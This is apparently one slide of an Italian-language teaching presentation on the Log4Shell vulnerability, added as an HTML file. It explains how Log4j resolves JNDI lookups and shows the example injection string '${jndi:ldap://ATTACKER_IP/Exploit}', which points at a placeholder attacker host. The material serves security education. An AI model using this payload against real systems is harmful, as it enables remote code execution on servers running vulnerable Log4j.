@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Log4Shell - La Falla</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/tomorrow-night-blue.min.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">JNDI: La radice del problema</h1>
+        <div class="subtitle">La Falla - JNDI Injection</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Sintassi malevola</div>
+                <div class="card-text">
+                    <pre><code class="language-bash">${jndi:ldap://ATTACKER_IP/Exploit}</code></pre>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Spiegazione</div>
+                <div class="card-text">
+                    <p><strong>JNDI (Java Naming and Directory Interface):</strong> Immaginalo come una "rubrica telefonica" per oggetti Java. Un programma può dire "JNDI, trovami la risorsa chiamata 'DatabaseConfig'".</p>
+                    <p><strong>Il Bug:</strong> Log4j non si limita a scrivere ${...} nel file di testo. Quando vede quella sintassi, la esegue. Interroga la rubrica (JNDI).</p>
+                    <p>Se noi controlliamo l'indirizzo della rubrica (ldap://nostro-ip), controlliamo la risposta.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 2;</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <script src="main.js"></script>
+</body>
+</html>
